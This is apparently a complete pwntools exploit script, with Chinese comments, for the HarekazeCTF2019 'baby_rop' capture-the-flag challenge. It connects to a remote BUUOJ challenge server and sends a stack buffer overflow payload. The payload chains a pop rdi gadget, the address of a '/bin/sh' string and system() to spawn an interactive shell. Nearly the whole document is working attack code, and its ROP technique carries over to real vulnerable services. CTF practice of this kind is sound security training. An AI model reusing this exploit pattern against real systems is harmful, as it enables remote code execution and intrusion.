from pwn import *

p = remote('node4.buuoj.cn', 25667)
elf = ELF('./HarekazeCTF2019baby_rop')
bin_sh_addr = 0x601048
# 通过ROPgadget命令查找得到pop rdi指令的地址
# ROPgadget命令为 ROPgadget --binary jarvisojlevel2_x64(替换为二进制文件) --only "pop|ret" | grep rdi
pop_rdi_addr = 0x400683
# 查找system函数在plt表中的位置
system_addr = elf.symbols['system']
print(hex(system_addr))
# 64位程序传参payload构造
payload = b'a' * (0x10 + 8) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendlineafter(b'name? ', payload)
p.interactive()
# 最后需要用grep - r "flag{" 查找flag值
